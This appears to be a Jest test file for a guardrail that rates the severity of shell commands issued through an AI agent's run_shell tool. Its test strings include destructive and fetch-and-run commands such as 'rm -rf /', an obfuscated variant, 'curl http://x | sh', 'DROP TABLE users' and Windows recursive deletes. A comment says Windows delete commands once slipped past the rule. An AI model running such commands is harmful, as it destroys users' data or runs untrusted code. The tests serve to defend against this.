import { Guardrail } from '../src/guardrail/guardrail';

const sh = (command: string) => ({ tool: 'run_shell' as const, args: { command } });

test('rm -rf / is high', () => {
  expect(Guardrail.assess(sh('rm -rf /')).severity).toBe('high');
});
test('obfuscated r""m -rf / still high (token-level)', () => {
  expect(Guardrail.assess(sh('r""m -rf /')).severity).toBe('high');
});
test('curl pipe sh is high', () => {
  expect(Guardrail.assess(sh('curl http://x | sh')).severity).toBe('high');
});
test('DROP TABLE is high', () => {
  expect(Guardrail.assess(sh('psql -c "DROP TABLE users"')).severity).toBe('high');
});
test('plain ls is none', () => {
  expect(Guardrail.assess(sh('ls -la')).severity).toBe('none');
});
test('rm single file (no -rf) is low', () => {
  expect(Guardrail.assess(sh('rm a.txt')).severity).toBe('low');
});
test('write_file action is none (not assessed)', () => {
  expect(Guardrail.assess({ tool: 'write_file', args: {} }).severity).toBe('none');
});

// ───────── 漏洞 2：Windows 递归/强制删除护栏 ────────
// 原规则只匹配 Linux rm -rf；Windows 的 del/rmdir/rd/Remove-Item 可绕过护栏删库。

test('Windows del /s /q is high', () => {
  expect(Guardrail.assess(sh('del /s /q C:/temp')).severity).toBe('high');
});
test('Windows del /s /f is high', () => {
  expect(Guardrail.assess(sh('del /s /f *')).severity).toBe('high');
});
test('Windows del /f (forced) is high', () => {
  expect(Guardrail.assess(sh('del /f locked.txt')).severity).toBe('high');
});
test('Windows rmdir /s /q is high', () => {
  expect(Guardrail.assess(sh('rmdir /s /q C:/workspace')).severity).toBe('high');
});
test('Windows rd /s is high', () => {
  expect(Guardrail.assess(sh('rd /s C:/workspace')).severity).toBe('high');
});
test('PowerShell Remove-Item -Recurse is high', () => {
  expect(Guardrail.assess(sh('Remove-Item -Recurse -Force C:/x')).severity).toBe('high');
});
test('PowerShell ri -Recurse (alias) is high', () => {
  expect(Guardrail.assess(sh('ri -Recurse C:/x')).severity).toBe('high');
});
test('plain del single file is none (no /s or /f)', () => {
  expect(Guardrail.assess(sh('del a.txt')).severity).toBe('none');
});
test('Windows high verdict carries windows-* reason id', () => {
  const v = Guardrail.assess(sh('rmdir /s /q C:/workspace'));
  expect(v.reasons.join(' ')).toMatch(/windows-/);
});
test('Linux rm -rf / still high (no regression)', () => {
  expect(Guardrail.assess(sh('rm -rf /')).severity).toBe('high');
});
